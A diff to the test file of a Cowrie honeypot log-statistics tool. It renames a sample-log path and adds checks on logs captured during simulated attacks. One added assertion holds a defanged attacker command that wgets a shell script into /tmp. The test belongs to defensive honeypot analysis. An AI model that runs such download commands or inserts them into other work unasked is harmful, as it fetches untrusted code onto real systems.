@@ -9,7 +9,7 @@ from .conftest import REPO, session_events, write_jsonl
 COUNTRY_DB = REPO / "data" / "geoip" / "dbip-country-lite.mmdb"
 ASN_DB = REPO / "data" / "geoip" / "dbip-asn-lite.mmdb"
 SYNTHETIC = REPO / "samples" / "synthetic"
-LOCAL_DOCKER = REPO / "samples" / "local-docker"
+LOCAL_COWRIE = REPO / "samples" / "local-cowrie"
 
 
 def test_run_once_writes_stats_atomically(tmp_path):
@@ -103,12 +103,12 @@ def test_real_dbip_lookup():
     assert set(geo.database_dates()) == {"country", "asn"}
 
 
-@pytest.mark.skipif(not (LOCAL_DOCKER / "cowrie.json").exists(),
+@pytest.mark.skipif(not (LOCAL_COWRIE / "cowrie.json").exists(),
                     reason="no captured local Cowrie log")
-def test_real_cowrie_log_from_local_container(tmp_path):
-    """Logs written by an actual Cowrie container under scripted local attack traffic."""
+def test_real_cowrie_log_from_local_run(tmp_path):
+    """Logs written by a real Cowrie 3.1.4 process under tools/simulate_attacks.py."""
     out = tmp_path / "stats.json"
-    cli.main(["--logs", str(LOCAL_DOCKER), "--out", str(out), "--end", "last-event",
+    cli.main(["--logs", str(LOCAL_COWRIE), "--out", str(out), "--end", "last-event",
               "--days", "2", "--dataset", "local-test"])
     doc = json.loads(out.read_text(encoding="utf-8"))
     t = doc["totals"]
@@ -116,3 +116,13 @@ def test_real_cowrie_log_from_local_container(tmp_path):
     assert t["ssh_sessions"] > 0 and t["telnet_sessions"] > 0
     assert t["login_attempts"] > 0 and t["login_successes"] > 0
     assert t["commands"] > 0
+    # Real event shapes for both payload paths: wget download and SFTP upload.
+    via = {v for p in doc["payloads"] for v in p["via"]}
+    assert via == {"download", "upload"}
+    commands = [c["value"] for c in doc["commands"]]
+    assert "cd /tmp && wget hxxp://example[.]com/local-test.sh" in commands
+    text = out.read_text(encoding="utf-8")
+    assert "127.0.0.1" not in text
+    assert "http://" not in text
+    # Loopback sources are never geolocated.
+    assert {c["code"] for c in doc["countries"]} == {"ZZ"}
